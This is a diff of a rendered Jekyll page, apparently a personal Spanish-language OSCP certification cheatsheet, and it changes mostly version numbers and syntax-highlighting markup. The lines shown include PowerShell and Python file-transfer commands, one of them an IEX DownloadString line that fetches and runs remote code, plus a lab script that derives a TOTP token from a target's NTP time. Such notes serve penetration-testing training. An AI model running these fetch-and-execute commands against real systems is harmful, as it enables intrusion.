@@ -46,7 +46,7 @@
 
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
-<meta name="generator" content="Jekyll v4.3.1" />
+<meta name="generator" content="Jekyll v4.3.4" />
 <meta property="og:title" content="OSCP Cheatsheet" />
 <meta property="og:locale" content="es" />
 <meta name="description" content="Bienvenidos a mi Cheatsheet personal para la certificación de la OSCP" />
@@ -3624,8 +3624,8 @@ scp <span class="nt">-P</span> 2222 <span class="nt">-i</span> id_rsa pspy www-d
 
 </span><span class="c"># Powershell</span><span class="w">
 </span><span class="n">powershell.exe</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'&lt;URL&gt;'</span><span class="p">,</span><span class="w"> </span><span class="s1">'&lt;DESTINATION_FILE&gt;'</span><span class="p">)</span><span class="w">
-</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nx">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'&lt;URL&gt;'</span><span class="p">)</span><span class="w">
-</span><span class="n">powershell</span><span class="w"> </span><span class="s2">"wget &lt;URL&gt;"</span><span class="w">
+</span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nx">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'&lt;URL&gt;'</span><span class="p">)</span><span class="w">
+</span><span class="nx">powershell</span><span class="w"> </span><span class="s2">"wget &lt;URL&gt;"</span><span class="w">
 
 </span><span class="c"># Python</span><span class="w">
 </span><span class="n">python.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"</span><span class="w">
@@ -3950,15 +3950,15 @@ tput civis<span class="p">;</span> <span class="k">for </span>host <span class="
 10
 11
 </pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
-</span><span class="kn">import</span> <span class="nn">pyotp</span>
-<span class="kn">import</span> <span class="nn">ntplib</span>
+</span><span class="kn">import</span> <span class="n">pyotp</span>
+<span class="kn">import</span> <span class="n">ntplib</span>
 
-<span class="n">client</span><span class="o">=</span><span class="n">ntplib</span><span class="p">.</span><span class="n">NTPClient</span><span class="p">()</span>
-<span class="n">response</span><span class="o">=</span><span class="n">client</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">"10.10.10.246"</span><span class="p">)</span>
+<span class="n">client</span><span class="o">=</span><span class="n">ntplib</span><span class="p">.</span><span class="nc">NTPClient</span><span class="p">()</span>
+<span class="n">response</span><span class="o">=</span><span class="n">client</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="sh">"</span><span class="s">10.10.10.246</span><span class="sh">"</span><span class="p">)</span>
 
-<span class="n">totp</span> <span class="o">=</span> <span class="n">pyotp</span><span class="p">.</span><span class="n">TOTP</span><span class="p">(</span><span class="s">"orxxi4c7orxwwzlo"</span><span class="p">)</span>
+<span class="n">totp</span> <span class="o">=</span> <span class="n">pyotp</span><span class="p">.</span><span class="nc">TOTP</span><span class="p">(</span><span class="sh">"</span><span class="s">orxxi4c7orxwwzlo</span><span class="sh">"</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s">"EL TOKEN es -&gt; %s"</span> <span class="o">%</span> <span class="n">totp</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">tx_time</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">EL TOKEN es -&gt; %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">totp</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">tx_time</span><span class="p">))</span>
 
 </pre></td></tr></tbody></table></code></div></div>
 
